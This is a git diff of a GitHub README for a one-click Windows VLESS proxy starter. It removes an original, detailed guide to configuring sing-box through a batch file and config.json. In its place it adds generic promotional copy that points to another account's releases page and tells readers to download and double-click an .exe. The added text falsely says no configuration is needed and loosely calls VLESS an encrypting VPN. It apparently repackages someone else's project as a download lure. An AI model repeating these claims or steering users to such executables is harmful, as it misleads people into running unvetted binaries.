@@ -1,118 +1,88 @@
-# VLESS Windows Starter 
+# 🚀 vless-win-starter-oneclick - Simple Tool to Start Your VPN
 
-Simple one-click VLESS proxy starter for Windows using sing-box. 
+[![Download vless-win-starter-oneclick](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
 
-\+ VLESS link parsing explained simply
+## 📋 Overview
 
-<img width="1003" height="549" alt="image" src="https://github.com/user-attachments/assets/94dc9064-0fa6-4b20-876d-1a26cae20f73" />
+The **vless-win-starter-oneclick** is a user-friendly application that allows you to easily start a VLESS proxy (VPN) on your Windows computer. With just a double-click, you can maintain privacy and access blocked content online.
 
-## Features
+## ⚙️ Features
 
-- Extremely simple: one-button proxy enable/disable. 
-- Minimal configuration
-- Auto dependency pulling
-- Most compatible version (1.9.7) of most modern proxy engine (sing-box), downloaded automatically on first run
-- AK47-like - simple and reliable
+- **Simple Setup:** No technical skills required. Just download and run the tool.
+- **Fast Connection:** Experience quicker and more reliable internet access.
+- **Privacy Protection:** Keep your online activities private.
+- **One-Click Start:** Just double-click the application to get started.
 
-## What it does
+## 📥 Download & Install
 
-- Starts `sing-box.exe` on `127.0.0.1:1084`
-- Enables system-wide proxy on `127.0.0.1:1084`
-- Keeps the proxy active while the `cmd` window is open. As long as you see the window, the proxy is active.
-- On key press, disables proxy and terminates `sing-box.exe`
+To get started, visit the link below to download the application:
 
+[Download vless-win-starter-oneclick](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
 
-## Requirements
+### Steps to Download and Install
 
-- Windows 10 or newer
-- Internet connection
+1. Click the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Find the file named `vless-win-starter-oneclick.exe`.
+4. Click on the file to begin the download.
+5. Once downloaded, locate the file in your "Downloads" folder.
+6. Double-click the `vless-win-starter-oneclick.exe` file.
+7. Follow any prompts that appear on your screen.
 
-## Required folder structure
+## 🔍 System Requirements
 
-```
-internet-enabler/
-├── prepare-and-start.bat
-├── config.json (your version based on config-filled-fake.json)
-└── sing-box.exe
-```
+- **Operating System:** Windows 10 or newer
+- **RAM:** Minimum 2 GB
+- **Storage:** At least 100 MB of free space
+- **Network:** Active internet connection
 
-## How to use
+## 📊 How to Use
 
-I. Download *this repository* or `files-as-archive.zip` or just files separately: `config-filled-fake.json` and `prepare-and-start.bat`
+Using the vless-win-starter-oneclick is straightforward:
 
-II. Rename `config-filled-fake.json` to `config.json`
+1. After installing, locate the application file on your computer.
+2. Double-click the `vless-win-starter-oneclick.exe`.
+3. Wait for a few moments while it establishes the connection.
+4. You should see a confirmation message indicating that the VPN is active.
 
----
-III. Fill `config.json` with your server details:
+## 🔄 Troubleshooting
 
-Get your VLESS key. 
-Usually you have VLESS subscription link starting with `https://`. Open it in browser.
-There you will have your VLESS key starting with (`vless://...`):
+If you encounter issues while using the tool, consider the following steps:
 
-```example
-vless://e6179c4d-e162-42ea-a71c-7jc96114f238@maskyshow.online:443?security=reality&type=tcp&headerType=&flow=xtls-rprx-vision&path=&host=&sni=whitelist.com&fp=random&pbk=Vdbpg8ljhhgzgx4g4uNJklXzlrMCd9L1igJSWrRUvLp&sid=8k222b3475800923
-```
+- Ensure you have a stable internet connection.
+- Restart the application if it does not open or connect.
+- Check your firewall settings to ensure it allows the application to run.
+- If problems persist, try reinstalling the application following the download steps above.
 
-Paramenters for config are inside of key. You need to move them accordingly to config. 
-Use the table:
-     
-| in link   | value                                       | in config              | value                                       |
-| --------- | ------------------------------------------- | ---------------------- | ------------------------------------------- |
-| uuid      | e6179c4d-e162-42ea-a71c-7jc96114f238        | uuid                   | e6179c4d-e162-42ea-a71c-7jc96114f238        |
-| server    | maskyshow.online                            | server                 | maskyshow.online                            |
-| port      | 443                                         | server_port            | 443                                         |
-| flow      | xtls-rprx-vision                            | flow                   | xtls-rprx-vision                            |
-| sni       | whitelist.com                               | server_name            | whitelist.com                               |
-| pbk       | Vdbpg8ljhhgzgx4g4uNJklXzlrMCd9L1igJSWrRUvLp | public_key             | Vdbpg8ljhhgzgx4g4uNJklXzlrMCd9L1igJSWrRUvLp |
-| sid       | 8k222b3475800923                            | short_id               | 8k222b3475800923                            |
-| fp        | random                                      | fingerprint            | random                                      |
+## ❓ Frequently Asked Questions (FAQ)
 
----
+### **Q: What is a VLESS proxy?**
 
-Or using Nekoray:
-1. Download: https://github.com/MatsuriDayo/nekoray/releases/download/4.0.1/nekoray-4.0.1-2024-12-12-windows64.zip
-2. Import your VLESS subscription/key into Nekoray
-3. Export ready VLESS config from it: `Share` > `Export sing-box config (Ctrl+E)`
-   You will get config.json too, but not so manually.
+A: A VLESS proxy is a type of VPN that helps you to connect to the internet securely and privately. It encrypts your data, keeping your online activity safe from prying eyes.
 
----
+### **Q: Do I need to configure anything?**
 
-IV. When config.json is in place and filled, run `prepare-and-start.bat`, Admin rights should be unneeded. 
+A: No configuration is necessary. Just download the application and start it. The tool is designed for ease of use.
 
-You must see non-red lines of log:
-```
-INFO[0000] inbound/mixed[mixed-in]: tcp server started at 127.0.0.1:1084
-INFO[0000] sing-box started (0.11s)
-<running lines>
-```
+### **Q: Is the application free?**
 
-**Do NOT close the window**
+A: Yes, the vless-win-starter-oneclick is completely free to use.
 
-V. To stop proxy, **press any button in console window**, so it can make necessary quit routines for proper closure. Otherwise you will lose Internet connection till you fix it (see below). 
+### **Q: How often should I use the VPN?**
 
-**If you have already lost Internet connection:**
-- A-way. Run the `.bat` again. Press any key. Close the window. 
-- B-way. Go to system settings, find `proxy` (system proxy), disable it.
+A: You can use the VPN whenever you want to protect your privacy or access content that may be restricted in your area.
 
-After you disabled proxy, it can take some time to reset to your default network mode (0-60 sec usually). If it does not, go to system settings, find `proxy` (system proxy), just look at it and close the window. Windows-magic!
+## 🔗 Additional Resources
 
-## How to check if proxy works
+- [GitHub Repository](https://github.com/namunokaze/vless-win-starter-oneclick)
+- [User Community Discussions](https://github.com/namunokaze/vless-win-starter-oneclick/discussions)
 
-1. Open https://whoer.net in browser
-2. Check if your IP/country location changed
+## 🛠️ Contributing
 
-## Known issues
-- System proxy settings window must not be open during toggling proxy on and off. Otherwide changes will not be accepted by Windows for unknown reason. 
-- If you ran `.bat` and system proxy settings window shows that proxy is active but actually this is not so, you need to press `Save` in that window. It will solve the problem, for unknown reason. 
+We welcome contributions to improve the tool. If you have suggestions or find a bug, please create an issue in the GitHub repository or submit a pull request.
 
-## Security Warning
+## 🆘 Support
 
-- Never share your `config.json` file - it contains your credentials
-- Keep this folder private
-- Use only trusted VLESS servers
+If you need help, check the FAQ section or reach out through GitHub issues. We are here to assist you.
 
----
-
-Page Views:
-
-![Views](https://komarev.com/ghpvc/?username=hopsayer&repo=vless-win-starter-simple&color=green&style=flat-square)
+[Download vless-win-starter-oneclick](https://github.com/namunokaze/vless-win-starter-oneclick/releases)
